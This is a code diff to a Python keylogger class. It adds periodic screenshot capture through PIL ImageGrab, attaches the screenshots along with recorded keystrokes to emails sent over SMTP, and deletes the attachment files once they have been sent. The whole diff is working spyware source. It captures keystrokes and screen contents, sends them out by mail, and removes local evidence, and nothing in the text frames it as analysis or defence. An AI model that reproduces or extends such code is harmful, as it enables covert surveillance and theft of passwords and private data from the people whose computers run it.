@@ -1,8 +1,10 @@
 import keyboard
 import smtplib # SMTP (Simple Mail Tranfer Protocol)
+import os
 from threading import Timer
 from datetime import datetime
 from os.path import basename
+from PIL import ImageGrab
 from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
@@ -73,12 +75,11 @@ class Keylogger:
         
         # add file attachments to email
         for file in files:
-            # open with read and binary mode
-            attachment = MIMEApplication(
-                    open(file, "rb").read(),
-                    Name = basename(file)
-                )
-            file.close()
+            # open file with read and binary mode
+            f = open(file, "rb")
+            attachment = MIMEApplication(f.read(), Name = basename(file))
+            f.close()
+            os.remove(f'{file}')
             # After the file is closed
             attachment['Content-Disposition'] = f'attachment; filename="{basename(file)}"'
             email.attach(attachment)
@@ -129,12 +130,27 @@ class Keylogger:
         timer.start()
 
     def capture_img(self):
-        timer = Timer(interval=(self.interval/2), function=self.capture)
+        if not os.path.exists("file_attachments"):
+            os.mkdir("file_attachments") # make attachment directory in current directory
+        # capture screen shot
+        dt = f'{datetime.now()}'
+        img = ImageGrab.grab()
+        img_name = f'file_attachments/screenshot{dt.replace(".", "-").replace(":", "-").replace(" ", "_")}.png'
+        self.attachments.append(img_name)
+        img.save(img_name)
+
+        # set interval for screen capture
+        if self.interval/2 > 5:
+            interval = 5
+        else:
+            interval = self.interval/2
+        timer = Timer(interval=interval, function=self.capture_img)
         # set the thread as daemon (dies when main thread die)
         timer.daemon = True
         # start the timer
         timer.start()
     
+
 
     def start(self):
         # record the start datetime
@@ -142,7 +158,7 @@ class Keylogger:
         # start the keylogger
         keyboard.on_release(self.update_log)
         # start capturing the screen
-
+        self.capture_img()
         # start reporting the keylogs
         self.report()
         # make a simple message
